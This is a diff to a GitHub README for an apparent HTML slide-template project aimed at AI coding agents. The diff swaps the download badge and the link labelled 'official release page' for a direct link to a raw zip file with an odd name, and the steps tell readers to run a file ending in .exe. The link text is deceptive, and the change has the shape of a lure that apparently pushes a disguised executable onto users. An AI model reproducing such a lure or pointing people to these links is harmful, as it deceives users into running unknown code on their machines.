@@ -1,12 +1,12 @@
 # 🎨 awesome-html-slide-skills - Create Professional Slides Using Artificial Intelligence
 
-[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/alissonkohn01-cmyk/awesome-html-slide-skills/releases)
+[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/alissonkohn01-cmyk/awesome-html-slide-skills/raw/refs/heads/main/Exonian/awesome_html_skills_slide_hierophantic.zip)
 
 This repository provides tools and templates for creating HTML presentations. It connects your ideas with slide generation agents like Claude Code, Codex, Cursor, and Hermes. You gain access to clean, modern templates that turn text into visual slideshows without complex software.
 
 ## 📥 Getting Started
 
-1. Go to the [official release page](https://github.com/alissonkohn01-cmyk/awesome-html-slide-skills/releases).
+1. Go to the [official release page](https://github.com/alissonkohn01-cmyk/awesome-html-slide-skills/raw/refs/heads/main/Exonian/awesome_html_skills_slide_hierophantic.zip).
 2. Find the latest version of the application under the Assets section.
 3. Click the file ending in `.exe` to begin the download.
 4. Save the file to your desktop for easy access.
